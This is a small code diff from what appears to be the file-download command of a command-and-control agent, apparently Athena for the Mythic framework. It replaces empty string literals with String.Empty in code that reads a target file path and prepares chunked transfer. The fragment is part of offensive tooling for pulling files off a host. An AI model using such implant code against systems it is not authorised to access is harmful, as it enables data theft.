@@ -25,7 +25,7 @@ namespace Athena.Commands
         {
             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
             Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-            downloadJob.path = par["File"].Replace("\"", "");
+            downloadJob.path = par["File"].Replace("\"", String.Empty);
             downloadJob.total_chunks = await this.GetTotalChunks(downloadJob);
             this.downloadJobs.GetOrAdd(job.task.id, downloadJob);
 
@@ -43,15 +43,15 @@ namespace Athena.Commands
             }
             return new DownloadResponse
             {
-                user_output = "",
+                user_output = String.Empty,
                 task_id = job.task.id,
                 total_chunks = downloadJob.total_chunks,
                 full_path = downloadJob.path,
-                completed = "",
-                status = "",
+                completed = String.Empty,
+                status = String.Empty,
                 chunk_num = 0,
-                chunk_data = "",
-                file_id = ""
+                chunk_data = String.Empty,
+                file_id = String.Empty
             };
         }
         /// <summary>
